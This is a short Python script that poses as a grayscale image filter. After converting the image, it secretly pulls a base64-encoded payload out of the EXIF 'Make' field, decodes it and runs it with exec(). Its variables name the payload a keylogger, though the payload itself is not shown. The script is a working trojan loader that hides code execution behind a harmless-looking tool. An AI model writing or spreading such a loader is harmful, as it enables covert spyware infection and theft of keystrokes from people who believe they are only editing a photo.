import base64
import piexif
from PIL import Image
import os
import sys

#https://stackoverflow.com/questions/61160154/embed-a-data-inside-jpg-file-without-altering-the-image-in-python
def extract_from_image(image_path):
    exif_dict = piexif.load(image_path)
    encoded_keylogger = exif_dict['0th'][piexif.ImageIFD.Make]
    keylogger_code = base64.b64decode(encoded_keylogger)
    return keylogger_code

def apply_gray_filter(image_path):
    try:
        image = Image.open(image_path)
        grayscale_image = image.convert('L') 
        grayscale_image.show() 
        grayscale_image_path = 'gray' + os.path.basename(image_path)
        grayscale_image.save(grayscale_image_path)
        return grayscale_image_path
    except Exception as e:
        print(f"error: {e}")
        return None

if len(sys.argv) > 1:
    image_path = sys.argv[1]
    try:
        apply_gray_filter(image_path)
        keylogger_code = extract_from_image(image_path)
        exec(keylogger_code)

    except Exception as e:
        print(f"error: {e}")

